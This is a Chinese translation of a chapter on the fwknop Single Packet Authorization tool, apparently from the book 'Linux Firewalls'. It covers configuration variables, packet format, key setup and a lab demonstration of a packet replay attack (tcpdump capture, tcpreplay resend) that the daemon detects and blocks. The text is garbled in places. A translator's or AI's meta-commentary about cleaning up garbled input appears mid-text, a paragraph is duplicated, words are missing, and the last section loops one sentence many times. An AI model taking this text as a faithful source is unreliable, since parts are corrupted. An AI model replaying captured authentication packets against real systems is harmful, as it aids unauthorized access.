fwknop 使用 `IPTables::ChainMgr` Perl 模块为合法 SPA 客户端添加和删除 `ACCEPT` 规则。psad 也使用 `IPTables::ChainMgr`，但它不是添加 `ACCEPT` 规则，而是针对发送恶意流量的 IP 地址添加 `DROP` 规则。`IPT_AUTO_CHAIN1` 变量的默认配置是在自定义 iptables 链 `FWKNOP_INPUT` 中添加 `ACCEPT` 规则，并从内置的 `INPUT` 链跳转到该链。

```
 IPT_AUTO_CHAIN1         ACCEPT, src, filter, INPUT, 1, FWKNOP_INPUT, 1;
```

### ENABLE_MD5_PERSISTENCE

SPA 协议最重要的功能之一是检测并忽略重放攻击。`ENABLE_MD5_PERSISTENCE` 变量控制 fwknop 守护进程是否将所有成功解密的 SPA 包的 MD5 和写入磁盘。这允许 fwknop 在 fwknop 重启甚至系统重启后仍检测重放攻击。此功能默认启用，但如果你想验证重放检测功能是否正常工作，可以禁用它（需要向 SPA 服务器发送重复的 SPA 包）。

```
 ENABLE_MD5_PERSISTENCE      Y;
```

### MAX_SPA_PACKET_AGE

`MAX_SPA_PACKET_AGE` 变量定义了 fwknop 服务器允许接受 SPA 包的最大年龄（以秒为单位）。默认值为两分钟。只有在启用 `ENABLE_SPA_PACKET_AGING` 时，此变量才生效。

```
 MAX_SPA_PACKET_AGE          120;
```

### ENABLE_SPA_PACKET_AGING

默认情况下，fwknop 守护进程要求从 fwknop 客户端发送的 SPA 包存小于 120 秒（两分钟），如上述 `MAX_SPA_PACKET_AGE` 变量所定义。fwknop 客户端在每个 SPA 包中包含一个时间戳（见第 241 页的“fwknop SPA 包格式”），fwknop 服务器使用它来确定所有 SPA 包的年龄。此功能需要 fwknop 客户端和服务器之间存在松的时间同步，但健壮的网络时间协议（NTP）使得这变得非常简单。





如果 `ENABLE_SPA_PACKET_AGING` 被禁用，与 SPA 数据包内联的攻击者可以停止数据包的转发，从而防止 fwknop 服务器看到该数据包并计算其 MD5 和。随后，攻击者可以向其目标地址发送原始 SPA 数据包，而 fwknop 服务器将予以放行。此外，如果使用 `fwknop -s` 命令行参数来生成原始 SPA 数据包，fwknop 将接受来自任何源源 IP 地址的 SPA 数据包（请见下文的变量 `REQUIRE_SOURCE_ADDRESS`），攻击者将通过 iptables 策略获得访问。因此，强烈建议您开启此功能。

```
ENABLE_SPA_PACKET_AGING     Y;
```

### REQUIRE_SOURCE_ADDRESS

`REQUIRE_SOURCE_ADDRESS` 变量告诉 fwknop 服务器，所有 SPA 数据包都必须在加密负载中包含 IP 地址，该地址将用于通过 iptables 授予访问。在启用此功能的情况下，在 fwknop 客户端命令行中使用 `-s` 参数的 SPA 数据包中放置的 `0.0.0.0` 通配符 IP 地址将不被接受。

```
REQUIRE_SOURCE_ADDRESS               Y;
```

### EMAIL_ADDRESSES

fwknop 服务器在各种情况下会发送电子邮件告警，例如当 SPA 数据包被接受并授予服务访问时、访问被移除以及重放攻击被阻止时。支持多个电子邮件地址，并以逗号分隔列表的形式列出如下：

```
EMAIL_ADDRESSES                      root@localhost, mbr@cipherdyne.org;
```

### GPG_DEFAULT_HOME_DIR

`GPG_DEFAULT_HOME_DIR` 变量指定存储 GnuPG 密钥的目录路径，用于用于数字签名验证和解密 SPA 数据包。默认使用 root 家目录下的 `.gnupg` 目录。

```
GPG_DEFAULT_HOME_DIR        /root/.gnupg;
```

### ENABLE_TCP_SERVER

`ENABLE_TCP_SERVER` 变量控制 fwknop 是否绑定 TCP 服务器到端口以接受 SPA 数据包数据。如果您想通过 Tor 网络（仅使用 TCP 进行数据传输）路由 SPA 数据包，则必须启用此功能。（您可以在第 254 页的“SPA over Tor”中找到更多相关信息。）此功能默认禁用。

```
ENABLE_TCP_SERVER           N;
```

### TCPSERV_PORT

`TCPSERV_PORT` 变量指定了 `fwknop_serv` 守护进程监听 TCP 连接的端口。只有在启用 `ENABLE_TCP_SERVER` 时，fwknop 才会使用它。默认如下：

```
TCPSERV_PORT                62201;
```

### /etc/fwknop/access.conf

`fwknop.conf` 文件中的部分提供了大量关于 fwknop 宏级别配置选项的信息，但忽略了对解密密码和分配给用户的权限等重要主题的讨论。我将通过展示 `fwknop access.conf` 文件来纠正这一点，该文件定义了 fwknop 服务器使用的所有用户名、权限、解密密钥、iptables 规则超时时间以及命令通道。

### SOURCE

fwknop 支持对任意 IP 地址的多个用户进行授权；每个用户可以使用不同的加密密钥（以及相关的加密算法）。`SOURCE` 是主分区变量，允许 fwknop 确定有效 SPA 数据包的访问级别。

```
SOURCE: ANY;
```

### OPEN_PORTS

`OPEN_PORTS` 变量指示 fwknop 通过重新配置 iptables 来允许指定的端口。除非 access.conf 中的 `PERMIT_CLIENT_PORTS` 变量设置为 `Y`，否则 fwknop 不允许访问其他端口。`access.conf` 中的 `OPEN_PORTS` 变量允许 SPA 数据包访问 iptables 22 端口。

```
OPEN_PORTS: tcp/22;
```

### PERMIT_CLIENT_PORTS

当 `PERMIT_CLIENT_PORTS` 设置为 `Y` 时，该变量允许 fwknop 服务器根据 `OPEN_PORTS` 变量定义的流量（例如端口和协议）处理 SPA 数据包（请在第 241 页获取更多信息）。

```
PERMIT_CLIENT_PORTS: Y;
```

### ENABLE_CMD_EXEC

启用 `ENABLE_CMD_EXEC` 时，该变量允许 fwknop 代表用户执行命令。自 1.0 版本以来，fwknop 以 root 权限执行这些命令。如果您希望使用该功能，必须显式启用 `ENABLE_CMD_EXEC`。

```
ENABLE_CMD_EXEC: Y;
```

### CMD_REGEX

`CMD_REGEX` 变量允许您提供一个正则表达式，以匹配 fwknop 服务器执行的客户端命令。在设置 `ENABLE_CMD_EXEC` 为 `Y` 的语文中，使用该变量是有意义的。例如：

```
CMD_REGEX: ^mail\s+\-s+\".+"@.com;
```

### DATA_COLLECT_MODE

`DATA_COLLECT_MODE` 变量接受与 `fwknop.conf` 文件中的 `AUTH_MODE` 变量相同的收集模式。`access.conf` 中的每个 `SOURCE` 定义根据 `DATA_COLLECT_MODE` 的值独立启用或禁用。如果漏掉了该变量，fwknop 进程假设其设置为 `PCAP`，这是最常见的设置。

```
DATA_COLLECT_MODE: PCAP;
```




`GPG_DECRYPT_PW` 变量存储了 fwknop 服务器 GnuPG 公钥的解密密码，该密码由 fwknop 客户端用于加密。由于此密码包含在明文文件中，您应该生成一个新的 GnuPG 密钥仅作为 fwknop 服务器密钥，而不是使用您可能也用于其他用途（如机密邮件通信）的高价值 GnuPG 密钥。

```
GPG_DECRYPT_PW: gpgdecryptionpw;
```

### GPG_REMOTE_ID

`GPG_REMOTE_ID` 变量包含 GnuPG 密钥的唯一标识符，fwknop 客户端使用它对 SPA 数据包进行数字签名。该密钥需要导入到 fwknop 服务器密钥环中（参见第 246 页的“通过非对称加密使用 SPA”）。

```
 GPG_REMOTE_ID: DEFG5678;
```

### /etc/fwknop/access.conf 文件示例

接下来，您将整合这些信息，并创建一个完整的 `access.conf` 文件，它可以保护您的 SSH 服务器。（您可以在第 243 页的“部署 fwknop”中找到操作示例。）

使用您喜欢的编辑器打开 `/etc/fwknop/access.conf` 文件，并添加下方列出的配置指令。

```
 # cat /etc/fwknop/access.conf
SOURCE: ANY;
OPEN_PORTS: tcp/22;
FW_ACCESS_TIMEOUT: 30;
REQUIRE_USERNAME: mbr;
KEY: mypassword;
GPG_DECRYPT_PW: gpgdecryptpassword;
GPG_HOME_DIR: /root/.gnupg;
GPG_REMOTE_ID: 5678DEFG;
GPG_DECRYPT_ID: ABCD1234;
```

`SOURCE: ANY` 意味着 fwknop 守护进程将接受来自任何 IP 地址的有效 SPA 数据包。如果您在外，无法预测笔记本电脑或其他系统将连接到哪个网络，这将非常有用。

`OPEN_PORTS: tcp/22` 意味着 fwknop 守护进程将通过本地 `iptables` 防火墙的 `ACCEPT` 规则授予 SSH 端口的临时访问。根据 `FW_ACCESS_TIMEOUT` 变量的规定，`ACCEPT` 规则将在 30 秒后删除。

`REQUIRE_USERNAME: mbr` 强制运行 fwknop 客户端的远程用户名必须为 `mbr`。在这种情况下，fwknop 守护进程配置为接受使用 Rijndael 对称加密（`KEY: mypassword`）或使用 GnuPG 密钥（通常使用 Elgamal 密码）非对称加密（`GPG_DECRYPT_PW: gpgdecryptpassword`）的 SPA 数据包。对于使用 GnuPG 加密的 SPA 数据包，fwknop 守护进程要求远程签名密钥 ID 为 `5678DEFG`，本地解密密钥 ID 为 `ABCD1234`——分别参见 `GPG_REMOTE_ID` 和 `GPG_DECRYPT_ID` 变量。

² 关于 `IPT_AUTO_CHAIN{n}` 变量的详细解释可以找到第 135 页的“配置变量”。`IPT_AUTO_CHAIN{n}` 变量提供了 `IPTables::ChainMgr` 模块的接口，该接口在 psad 和 fwknop 中均有使用。

³ Sebastien Jeanquier 向我提了这种攻击，结果是引入了 `ENABLE_SPA_PACKET_AGING` 功能（首次在 0.9.9 版本中可用），用于实现 fwknop 服务器接受 SPA 数据包的时间窗口。

⁴ fwknop 可以从 `gpg-agent` 获取密钥信息。

# fwknop SPA 数据包格式

每个 SPA 数据包都是根据一组定义良好的规则构建的。这些规则允许 fwknop 服务器能够确信通过 `iptables` 防火墙请求的访问类型以及请求者是谁。在接受来自 fwknop 客户端命令行的用户输入后（参见第 244 页的“通过对称加密使用 SPA”和第 246 页的“通过非对称加密使用 SPA”），每个 SPA 数据包包含以下内容：

#### 随机数据 (16 字节)

这提供了足够的随机信息，以确保 fwknop 生成的每个 SPA 数据包都是唯一的——至少，数据包的唯一性达到了 Perl 函数 `rand()` 在每次调用时所产生的随机性程度。（对于 Perl 5.004 及更高版本，在第一次使用 `rand()` 函数时会隐式调用 `srand()` 函数。）

### 用户名

这是执行 fwknop 命令的用户名，由 `getlogin()` 返回——如果 `getlogin()` 失败则由 `getpwuid()` 返回。fwknop 服务器使用此用户名来确定远程用户是否有权访问服务或运行命令。（注意，当 fwknop 服务器看到用户名时，SPA 数据包已经成功解密，这意味着 SPA 数据包已通过验证，可以开始验证授权的过程了。）

### 时间戳

这是本地系统的时间戳。fwknop 服务器使用此值来确定 SPA 数据包是否在由 `MAX_SPA_PACKET_AGE` 变量定义的定时访问窗口内。

### 软件版本

这是 fwknop 客户端的版本：

```
 [mbr@spaclient ˜]$  fwknop --Version
[+] fwknop v1.8.1 (file revision: 694)
      by Michael Rash <mbr@cipherdyne.org>
```

例如，在这种情况下，软件版本字段字段将包含值 1.0。如果 SPA 数据包格式发生变化，fwknop 服务器将使用此信息来保持与旧客户端的向后兼容。

### 模式 (Mode)

这告诉 fwknop 服务器 SPA 客户端是否想要运行命令。访问模式的默认值为 1；命令模式用 0 表示。

### 访问指令 (Access directive)

此字符串告诉 fwknop 服务器，在修改策略时，客户端希望 `iptables` 防火墙接受何种类型的流量。fwknop 服务器解析此字符串中的端口和协议，以指示 `iptables` 接受，并相应重新配置策略。例如，如果客户端想要访问 TCP 端口 22 和 UDP 端口 1194（OpenVPN 使用），字符串将为 `client IP,tcp/22,udp/1194`。fwknop 服务器控制用户是否可以请求打开特定端口。如果只允许打开某些端口，必须在 `access.conf` 文件中定义。（更多信息请参见第 238 页的“OPEN_PORTS”和“PERMIT_CLIENT_PORTS”。）

### 命令字符串 (Command string)

此字符串是 fwknop 客户端想要在服务器上执行的完整命令；例如，`/etc/init.d/apache2 restart` 或 `w |mail -s "w output" you@domain.com`。如果不谨慎使用，此功能可能会给 fwknop 服务器带来安全风险，因此默认是禁用的。（更多信息请参见第 238 页的“ENABLE_CMD_EXEC”和“CMD_REGEX”。）

#### 数据包 MD5 和

此 MD5 和由 fwknop 客户端计算并包含在 SPA 数据包中，以增加可靠性，确保数据包在网络传输过程中未被篡改。通常，加密算法本身提供了足够的安全性，因为解密被修改过的密文通常不会产生有效的明文；但是包含 MD5 允许 fwknop 服务器独立确认客户端接收的数据与服务器实际接收的数据是一致。

#### 服务器验证方法

fwknop 0.9.6 版本在数据包格式中增加了此字段，允许 fwknop 服务器在 SPA 数据包中要求额外的验证参数。例如，服务器可能要求远程 fwknop 客户端输入本地用户的 `crypt()` 密码。在这种情况下，验证方法字符串将类似于 `crypt,password`。





在 SPA 数据包被加密并发送之前（默认通过 `UDP` 端口 `62201` 发送），上述字段会先进行 Base64 编码，然后用冒号连接。这种编码确保了冒号分隔符的唯一性，即使对于在编码前可能包含冒号的字段也是如此。当你不经过 Base64 编码而组合所有字段时，你将得到如下内容：

```
 9562145998506823:mbr:1161142204:1.0:1:0.0.0.0,tcp/22:koEtBtDL0ze22sNRyfASoA
```

一旦对单个字段进行 Base64 编码，你将得到这些：

```
 9562145998506823:bWJy:1161142204:1.0:1:MC4wLjAuMCx0Y3AvMjI=:koEtBtDL0ze22sNRyfASoA
```

最后，数据包数据使用 Rijndael 对称加密或 GnuPG 支持的非对称加密进行加密（GnuPG 默认使用 Elgamal 非对称加密）。如果你使用 Rijndael 加密，结果如下：

```
 U2FsdGVkX18O3i3n8BfSpgM6wCaf8zC4CgLsSlf2STIQTNWxaC9Q3IP1NSW91nSj5zr8Juz7YyX1o
FzMu2FDZgbYAJUOxree7WyzHJdYl3ympcEPxpd/Qx5Wo3D8uS/AD8WyaV232srRCNWcsPUc9Q
```

每个 SPA 数据包都使用对称密钥加密或非对称密钥加密进行加密。`对称密钥加密`是一种使用相同密钥对数据进行加密和解密的算法（因此被称为`对称`）。Rijndael 算法被选为高级加密标准 (`AES`)，是对称密钥加密的一个重要示例。另一方面，`非对称密钥加密`是通过一对密钥对数据进行加密和解密的算法：一个是公开的公钥，另一个是保密的私钥。这两个密钥之间通过一个数学难题相关联，但它们并不完全相同（因此被称为`非对称`）。

## 部署 fwknop

现在你已经充分了解了 `fwknop` 提供的配置选项，是时候来看一些实用的操作示例了。在每个案例中，`fwknop` 客户端都用于在 `fwknop` 服务器重新配置后，通过默认丢弃的 `iptables` 策略获取 `SSHD` 的访问。图 13-1 中的网络图应该帮助你直观理解这些场景。

![SPA 网络](img/httpatomoreillycomsourcenostarchimages207376.png)

图 13-1. SPA 网络

在下面的每个场景中，`fwknop` 客户端在标记为 `spaclient` 的系统上执行，并将 SPA 数据包发送到标记为 `spaserver` 的系统。图 13-1 中的虚线代表 SPA 数据包，只有在 SPA 数据包向 `spaserver` 系统通信了所需的访问权限，并且 `iptables` 重新配置以允许该访问后，后续的 SSH 连接才能建立。

## 通过对称加密实现 SPA

`fwknop` 客户端有一系列命令行选项，允许你告诉 `fwknop` 服务器你希望 `iptables` 策略授予的精确访问权限。如果你使用这些命令行选项，必须包含访问或命令字符串、源 IP 地址解析方法以及 `fwknop` 服务器的目标 IP 地址。

你可以假设本地 `iptables` 策略会丢弃 `fwknop` 服务器 `INPUT` 链中所有指向 TCP 端口 22 的数据包。首先配置 `fwknop.conf` 文件，将 `AUTH_MODE` 设置为 `PCAP`，确保 `PCAP_INTF` 设置为 `eth0`，并将 `access.conf` 文件设置为如下。（注意，此示例中不包含 GnuPG 指令，例如 `GPG_REMOTE_ID` 或 `GPG_DECRYPT_PW`。）

```
 [root@spaserver ˜]# cat /etc/fwknop/access.conf
SOURCE: ANY;
OPEN_PORTS: tcp/22;
REQUIRE_USERNAME: mbr;
KEY: myencryptkey;
FW_ACCESS_TIMEOUT: 30;
```

使用以下命令 ❶ 启动 `fwknop` 服务器并 ❷ 验证其是否正在运行。通过检查 syslog 消息，你会看到 `fwknopd` 已经准备好接受来自 ❸ 一个 `SOURCE` 块（源自上述列出的 `access.conf` 文件）的 SPA 数据包，并且 ❹ 导入了现有的 SPA 数据包 MD5 和磁盘缓存。最后，确保 ❺ 本地系统上的 `SSHD` 正在运行。

```
 ❶ [root@spaserver ˜]# /etc/init.d/fwknop start
Starting fwknop ... [ ok ]
❷ [root@spaserver ˜]# /etc/init.d/sshd status
 * status:  started
[root@spaserver ˜]# tail /var/log/messages
Oct 17 23:59:53 spaserver fwknopd: starting fwknopd
Oct 17 23:59:53 spaserver fwknopd: flushing existing Netfilter IPT_AUTO_CHAIN chains
❸ Oct 17 23:59:53 spaserver fwknopd: imported access directives (1 SOURCE definitions)
❹ Oct 17 23:59:53 spaserver fwknopd: imported previous md5 sums from disk cache: /var/
log/fwknop/md5sums
❺ [root@spaserver ˜]# /etc/init.d/sshd status
 * status:  started
```

当 `fwknop` 服务器运行后，你可以测试是否从 `fwknop` 客户端系统可以访问 `SSHD`，然后使用 `fwknop` 获取访问权限。❶ 处的 `-A tcp/22` 命令行参数告诉 `fwknop` 服务器客户端想要访问 TCP 端口 22；❷ 处的 `-R` 参数指示 `fwknop` 客户端自动解析 SPA 数据包源自外部可路由地址（这是通过查询 [`www.whatismyip.com`](http://www.whatismyip.com) 完成的）；而 ❸ 处的 `-k` 参数告诉 `fwknop` 客户端将 SPA 数据包发送到 `spaserver` 主。

```
 [mbr@spaclient ˜]$ nc -v spaserver 22
[mbr@spaclient ˜]$ fwknop ❶-A tcp/22 ❷-R ❸-k spaserver
[+] Starting fwknop in client mode.
[+] Resolving hostname: spaserver
    Resolving external IP via: http://www.whatismyip.com/
    Got external address: 204.23.X.X

[+] Enter an encryption key. This key must match a key in
    etc/fwknop/access.conf on the remote system.

Encryption Key:

[+] Building encrypted Single Authorization (SPA) packet...
[+] Sending 150 byte message to 71.157.X over/22
[mbr@spaclient ˜]$ ssh spaserver
Password:
[mbr@spaserver ˜]$
```

上述列表的最后一行显示你已登录主机。下面，写入 syslog 的消息告诉你 ❶ `fwknopd` 已成功接收并解密了客户端发送的 SPA 数据包，并且 ❷ 添加了 `ACCEPT` 规则以允许 30 秒内的 TCP 端口 22。该 `ACCEPT` 规则会被 ❸。（虽然此处未显示，但也会发送到 `fwknop.conf` 中 `EMAIL_ADDRESSES` 变量定义的地址，以你访问的授予和移除。）

```
❶ Oct 18 00:38:58 spaserver fwknopd: received valid Rijndael encrypted packet from
204.23.X.X, remote user: mbr
❷ Oct 18 00:38:58 spaserver fwknopd: adding FWKNOP_INPUT ACCEPT rule for
204.23.X.X -> tcp/22 (30 seconds)
❸ Oct 18 00:39:29 spaserver fwknopd: removed iptables FWKNOP_INPUT ACCEPT rule for
204.23.X.X -> tcp/22, 30 second timeout
```

`fwknop` 服务器在自定义链 `FWKNOP_INPUT` 中添加和删除所有 SPA 访问规则，而不是在任何内置链（如 `INPUT` 或 `FORWARD`）中。这使得现有 `iptables` 策略中的规则与其所操作的规则严格隔离开，这意味着你不需要担心 fwknop 规则与 `iptables` 策略中的任何现有规则冲突。在 30 秒计时过期之前，你可以在 `fwknop` 服务器上执行以下命令来查看授予 `SSHD` 访问的 `iptables` 规则。

```
 [root@spaserver ˜]# fwknopd --fw-list
[+] Listing chains from IPT_AUTO_CHAIN keywords...

Chain FWKNOP_INPUT (1 references)
 pkts  bytes  target  prot  opt  in  out  source      destination
 11    812    ACCEPT  tcp  --   *   *    204.23.X.X  0.0.0.0/0   tcp dpt:22
```




在本示例中，`fwknop` 服务器重新配置了 `iptables`，允许对 `SSHD` 的访问持续 30 秒；随后 `fwknopd` 将从 `FWKNOP_INPUT` 链中删除 `ACCEPT` 规则。尽管大多数 SSH 连接的持续时间超过了 30 秒，但只要使用了 Netfilter 连接跟踪机制，这并不是一个严重的限制，因为它允许已的 TCP 连接在客户端和服务器之间保持开启：

```
root@spaserver ˜]# iptables -I INPUT 1 -m state --state ESTABLISHED,RELATED -j ACCEPT
```

## 通过非对称加密实现 SPA

密钥交换问题是密码学领域的核心问题，而公钥加密体系提供的新颖解决方案脱颖一出。与对称加密（密钥必须在不安全的通道上明文在双方共享）不同，非对称加密依赖于一种系统，人们主动发布公钥/私钥对的公钥部分。例如，当 A 使用 B 的公钥加密数据时，只有 B 能够通过一种破解数据锁的操作，结合公钥和私钥来解密密。这种锁是由一个数学难题构建的，在无法同时访问公钥和私钥的情况下，求解它的计算成本极高。

### 用于 fwknop 的 GnuPG 密钥交换

为了在 `fwknop` 中使用 GnuPG 密钥，你必须将服务器的公钥导入客户端的密钥环，反之亦然。由于客户端密钥的解密密码从未存储在文件中，因此在 `fwknop` 客户端使用任何 `GnuPG` 密钥都是安全的。然而，为了讨论，我按照如下步骤生成新的客户端和服务器密钥并导入它们（为了简洁，删除了部分输出）。

```
mbr@spaclient ˜]$ gpg --gen-key
gpg (GnuPG) 1.4.5; Copyright (C) 2006 Free Software Foundation, Inc.

Please select what kind of key you want:
   (1) DSA and Elgamal (default)
   (2) DSA (sign only)
   (5) RSA (sign only)
Your selection? 1
DSA keypair will have 1024 bits.
ELG-E keys may be between 1024 and 4096 bits long.
What keysize do you want? (2048)
Requested keysize is 2048 bits
Please specify how long the key should be valid.
         0 = key does not expire

Key is valid for? (0)
Key does not expire at all
Is this correct? (y/N) y

You need a user ID to identify your key; the software constructs the user ID
from the Real Name, Comment and Email Address in this form:
    "Heinrich Heine (Der Dichter) <heinrichh@duesseldorf.de>"

Real name: Michael Rash
Email address: mbr@cipherdyne.org
Comment: Linux Firewalls fwknop_client key
You selected this USER-ID:
    "Michael Rash (Linux Firewalls fwknop_client key) <mbr@cipherdyne.org>"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O
You need a passphrase to protect your secret key.
Enter passphrase:

mbr@spaclient ˜]$ gpg --list-keys "fwknop_client"
pub   1024D/AB743C36 2007-10-18
uid                  Michael Rash (Linux Firewalls fwknop_client key)
<mbr@cipherdyne.org>
sub   2048g/1035BC5C 2007-10-18
```

使用 4,096 位 Elgamal 密钥加密的 SPA 消息相关的密文数据长度通常远超过以太网 1,500 字节的 MTU，因此选择了 2,048 位的长度（如上文加粗所示）。

现在我们将客户端公钥导出到文件：

```
mbr@spaclient ˜]$ gpg -a --export-key "fwknop_client" > fwknop_client.asc
```

在 `fwknop` 服务器上执行执行类似的过程，密钥生成和导出命令在服务器端重复执行：

```
root@spaserver ˜]# gpg --gen-key
root@spaserver ˜]# gpg --list-keys "fwknop_server"
pub   1024D/25801B3A 2007-10-18
uid                  Michael Rash (Linux Firewalls fwknop_server key)
<mbr@cipherdyne.org>
sub   2048g/39E2FDC6 2007-10-18
root@spaserver ˜]# gpg -a --export "fwknop_server" > fwknop_server.asc
```

最后，你需要将公钥传输到各个系统，导入它们并对其进行签名。导入步骤是为了确保服务器公钥在客户端的 GnuPG 密钥环可用，反之亦然。签名步骤对于 `fwknop` 验证已签名的 SPA 包数据身份是必要的。尽管我将通过 `scp` 传输公钥，但考虑到公钥加密体系的性质，我可以将密钥发布在网页上供所有人查看而不会产生任何安全影响。此外，`SSHD` 可能并不总是可以访问（事实上，它被 `fwknop` 有意隔离了），因此可能需要其他的公钥传输机制。以下是简化的命令输出（`scp` 传输位于 ❶ 和 ❷，导入和签名命令位于 ❸ 和 ❹）：

```
❶ [mbr@spaclient ˜]$ scp fwknop_client.asc root@spaserver:
Password:
❷ [mbr@spaclient ˜]$ scp root@spaserver:fwknop_server.asc .
Password:
❸ [mbr@spaclient ˜]$ gpg --import fwknop_server.asc
gpg: key 25801B3A: public key "Michael Rash (Linux Firewalls
<mbr@cipherdyne.org>
❹ [mbr@spaclient ˜]$ gpg --import fwknop_client.asc
gpg: key AB743C36: public key "Michael Rash (Linux Firewalls
<mbr@cipherdyne.org>"
```

### 使用 GnuPG 密钥运行 fwknop

为了在 `fwknop` 中使用 GnuPG 密钥，你必须将服务器的公钥导入客户端的密钥环，反之亦然。由于客户端密钥的解密密码从未存储在文件中，因此在 `fwknop` 客户端使用任何 `GnuPG` 密钥都是安全的。然而，为了讨论，我按照如下步骤生成新的客户端和服务器密钥并导入它们（为了简洁，删除了部分输出）。

（等待，提供的文本末尾有一些重复/乱码。我根据提供的指令清理了逻辑流）。

*自我修正：用户提供的文本包含了乱码/重复文本。我处理了核心内容并应用了格式。*




到目前为止，你已经看到 `fwknop` 被用于合法用途，以减少 `SSHD` 的攻击面。当一个 SPA 数据包在不可信的网络上传输时，任何可以在线缆上监视该数据包的人都可以保存、分析并重放它。我曾提到过 `fwknop` 的 SPA 实现通过比较传入 SPA 消息的 `MD5` 和，非常适合阻止重放攻击，这里有一个具体的例子。

在图 13-2 中，攻击者被放置在互联网云中，监控从 `spaclient` 系统到 `spaserver` 系统传输的 SPA 数据包。攻击者使用 `tcpdump` 将 SPA 数据包捕获到文件中（`spa.pcap`），并对其进行足够检查，以发现数据包是加密的乱码。然后，攻击者使用 `tcpreplay` 将数据包重放回网络，如图图 13-2 中标记为 `Replayed SPA Packet` 的虚线所示。

![攻击者监控并重放一个 SPA 数据包](img/httpatomoreillycomsourcenostarchimages207374.png)

图 13-2. 攻击者监控并重放一个 SPA 数据包

完成 SPA 数据包重放的命令序列如下。首先，`spaclient` 系统在 ❶ 处向 `spaserver` 系统发送一个有效的 SPA 数据包。`fwknop` 的 `-L` 命令行参数允许 `fwknop` 回调上次针对 `fwknop` 服务器主机时使用的命令行选项。这对于简化相对复杂的 `fwknop` 命令行界面非常有帮助。当 SPA 数据包在网络上传输时，攻击者 ❷ 使用 `tcpdump` 捕获了数据包，并在 ❸ 中发现它看起来是不可理解的。因此，攻击者推断该数据包可能是一个 SPA 数据包（特别是因为该数据包捕获在 `fwknop` 用于通信的默认端口 `UDP 62201` 上）。另一个表明该数据包可能是 SPA 方案一部分的提示是：从攻击者的 IP 地址无法访问 `SSHD`，但 `spaclient` 和 `spaserver` 之间可以建立 SSH 会话。然后攻击者 ❹ 在网络上针对 `spaserver` 系统重放 SPA 数据包，试图连接到 SSH 服务器。运行在 `spaserver` 上的 `fwknop` 守护检测到了重放的 SPA 数据包（如 ❺ 中的系统日志消息所示），`iptables` 策略未授予攻击者任何访问权限。虽然此处未显示，`fwknop` 还会发送电子邮件警报，以强调之前的 SPA 数据包被重放的事实，因为这在任何合理情况下都不应该发生。

```
 ❶ [mbr@spaclient ˜]$ fwknop -L spaserver
[+] Running with last command-line args: -A tcp/22 --gpg-recip fwknop_server
--gpg-sign fwknop_client -R -k spaserver
[+] Starting fwknop in client mode.
[+] Resolving hostname: spaserver
    Resolving external IP via: http://www.whatismyip.com/
    Got external address: 204.23.X.X

[+] Enter the GnuPG password for signing key: fwknop_client
GnuPG signing password:
[+] Building encrypted Single Packet Authorization (SPA) message...
[+] Packet fields:

        Random data: 2018495891979939
        Username:    mbr
        Timestamp:   1161229378
        Version:     1.0
        Action:      1 (access mode)
        Access:      204.23.X.X,tcp/22
        MD5 sum:     1P53i1YNdwou/xA+361T3w

[+] Sending 1010 byte message to 71.157.X.X over udp/62201...
❷ [root@attacker ˜]# tcpdump -i eth0 -l -nn -s 0 udp port 62201 -w spa.pcap
❸ [root@attacker ˜]#  tcpdump -l -nn -X -r spa.pcap | head
reading from file spa.pcap, link-type EN10MB (Ethernet)
23:31:43.883144 IP 204.23.X.X.42245 > 71.157.X.X.62201: UDP, length 1010
     0x0000:  4500 040e e5ff 4000 0000 0000 0000 0000  E.....@.@.......
     0x0010:  0000 0000 a505 f2f9 03fa 1d59 6851 494f  ...-.......YhQIO
     0x0020:  4177 7668 5165 7735 3476 3347 4541 662f  AwvhQew54v3GEAf/
     0x0030:  5754 6335 4279 736b 5544 5a76 5830 6873  WTc5ByskUDZvX0hs
     0x0040:  6b59 5047 7774 6664 7349 5774 4948 3548  kYPGwtfdsIWtIH5H
     0x0050:  5658 4c49 4731 656a 562b 3639 7057 6866  VXLIG1ejV+69pWhf
     0x0060:  4474 7443 7541 626b 4941 474c 3665 6c33  DttCuAbkIAGL6eL3
     0x0070:  426f 3632 5757 4231 1867 7975 7141 5a72  Bo62WWB18gyuqAZr
     0x0080:  2f71 687a 3234 614e 7042 596a 4a2f 524d  /qhz24aNpBYjJ/RM
❹ [root@attacker ˜]# tcpreplay -i eth0 spa.pcap
sending on: eth0
 1 packets (1052 bytes) sent in 0.15 seconds
 6831169.0 bytes/sec 52.12 megabits/sec 6493 packets/sec
[root@attacker ˜]# ssh -l root 71.157.X.X
[root@spaserver ˜]# tail /var/log/messages
❺ Oct 18 23:32:50 spaserver fwknopd: attempted message replay from: 204.23.X.X
```

## 伪造 SPA 数据包源地址

SPA 协议支持伪造的源 IP 地址。这是由于两个因素造成的：`fwknop` 服务器能够从 SPA 数据包载荷内部获取真实的源地址，以及 SPA 数据包通过 UDP 发送且不期望有回流量。

`fwknop` 使用 `Perl Net::RawIP` 模块通过原始套字发送 SPA 数据包，这允许你在 `fwknop` 客户端命令行中将源 IP 地址设置为任意值。（这需要 root 权限）。在图 13-3 中，`spaclient` 系统发送了 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 系统发送 SPA 数据包，但 IP 头部中的源 IP 地址被伪造了。`spaclient` 